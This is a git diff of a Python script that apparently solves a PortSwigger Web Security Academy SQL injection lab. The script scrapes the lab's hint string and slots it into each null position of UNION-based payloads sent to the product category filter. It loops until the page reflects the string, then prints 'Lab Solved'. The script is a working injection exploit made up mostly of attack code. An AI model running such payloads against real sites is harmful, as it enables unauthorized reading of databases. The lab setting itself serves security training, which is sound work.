@@ -19,25 +19,25 @@ def check_internal_server_error(text):
 def fetch_string_literal(text):
     soup=bs4.BeautifulSoup(text,"html.parser")
     string_value=soup.find('p',attrs={'id':'hint'})
-    if string_value:
-        _string = string_value.get_text(strip=True)
-        _string=_string.split("'")
-        _string=_string[1]
-
-        print(_string)
-    else:
-        _string = None
-    return _string
+    _string = string_value.get_text(strip=True)
+    _string=_string.split("'")
+    _string=_string[1]
+    print("the target string is "  +_string)
+    return(_string)
+    
 
 def string_fetched_final_request(text):
-    soup= bs4.BeautifulSoup(text,"html.parser")
-    res=soup.find('tr',attrs={'th'})
-    res=res.get_text(strip=True)
-    return res
+    soup = bs4.BeautifulSoup(text, "html.parser")
+    tr_tag = soup.find('tr')
+    if tr_tag:
+        th_tag = tr_tag.find('th')
+        if th_tag:
+            return th_tag.get_text(strip=True)
+    return None
 
     
 def main():
-    host="https://0af100b8030a42c980685dde005400b4.web-security-academy.net"
+    host="https://0a32007103c9c02281bf1b86001b0086.web-security-academy.net"
     client=requests.Session()
     client.verify=False
     product_url=f'{host}/filter?category='
@@ -57,20 +57,21 @@ def main():
             payload=payload1+comment
     if check_internal_server_error(client.get(payload1+comment).text):
         s = f"{fetch_string_literal(client.get(host).text)}"
-        print("s= "+s)
+        s_no_quotes=s
+        s="'"+s+"'"
         parts = payload.split("null")
         payloads = [("null".join(parts[:i]) +s + "null".join(parts[i:])) for i in range(1, len(parts))]
-        print(payloads)
-        print(s)
         for i in payloads:
             print(i)
             resp = client.get(i)
             if resp.status_code==500:
                 continue
-            if s==string_fetched_final_request(resp.text):
+            if s_no_quotes == string_fetched_final_request(resp.text):
                 print(f'[+] Lab Solved LESSGOOOOO')
+                break
             else:
                 print(f'Try harder noob!')
+        
 
 
 if __name__=="__main__":
